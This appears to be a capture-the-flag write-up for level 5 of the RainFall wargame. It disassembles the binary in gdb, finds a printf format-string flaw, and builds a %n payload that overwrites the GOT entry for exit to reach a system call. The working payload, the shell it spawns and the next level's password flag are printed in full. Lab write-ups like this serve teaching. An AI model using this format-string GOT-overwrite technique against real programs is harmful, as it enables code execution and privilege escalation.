
# Level 5 — Format String Exploitation (GOT Overwrite)

## Vulnerability Analysis

By exploring the executable `level5`, we find three primary functions: `main`, `n`, and `o`.

1. **`main`**: Simply calls the function `n`.
2. **`o`**: Contains a call to `system` (which opens a shell or executes a command) and then exits.
```assembly
(gdb) disass main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret    
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disass o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.

```


3. **`n`**: Allocates a buffer of `0x200` (512 bytes), reads user input using `fgets`, passes it directly to `printf` (creating a format string vulnerability), and then immediately calls `exit()`.

```assembly
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt> ; vulnrable to format string attacks
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt> ; imediate exit
```

Unlike previous levels, there is no direct branch or variable comparison we can alter to reach the `system` call. However,
because `exit()` is called right after our vulnerable `printf`, we can perform a **GOT (Global Offset Table) Overwrite**. 
If we overwrite the GOT entry for `exit` with the address of function `o`, the program will execute `o` instead of terminating.

## The Goal

We need to use the format string vulnerability to overwrite the GOT address of `exit()` with the address of the function `o()`.

*   **Address of `o()` (The Value to Write)**: `0x080484a4`. In decimal, this is **134513828**.
*   **GOT Address of `exit()` (The Target)**: To find this, we inspect the `exit@plt` instruction:
    
```txt
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
```
The GOT entry for `exit` is located at `0x8049838`.

## Exploitation Steps

### 1. Find the Parameter Offset
We need to determine where our input string lands on the stack from `printf`'s perspective. We use a recognizable pattern (`aaaaaa`) followed by stack leak specifiers (`%08x`):

```txt
(gdb) run <<< $(python2 -c "print 'aaaaaa'+'-%08x'*6")
Starting program: /home/user/level5/level5 <<< $(python2 -c "print 'aaaaaa'+'-%08x'*6")
aaaaaa-00000200-b7fd1ac0-b7ff37d0-61616161-252d6161-2d783830

```

The hex representation of `aaaa` (`61616161`) appears as the **4th parameter** on the stack.

### 2. Crafting the Payload

Our payload must write the decimal value of the address of `o()` (`134513828`) into the GOT address of `exit()` (`0x8049838`).

We will use the `%n` format specifier, which writes the number of bytes printed so far into a specific memory address.

* **Target Address (in Little Endian)**: `\x38\x98\x04\x08` (This takes up 4 bytes).
* **Required Value**: `134513828` bytes.
* **Padding needed**: $134513828 - 4 = 134513824$ bytes.
* **Target Offset**: Position `4` (using `%4$n`).

The payload structure is: `[Target Address] + [Padding using %d] + [%4$n]`

```bash
python2 -c 'print "\x38\x98\x04\x08%134513824d%4$n"'

```

## Final Execution

We pipe the payload into the executable and use `cat` to keep the input stream open for the resulting shell:

```bash
level5@RainFall:~$ (python2 -c 'print "\x38\x98\x04\x08%134513824d%4$n"'; cat) | ./level5
....[Massive output of 134,513,824 spaces] 512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

```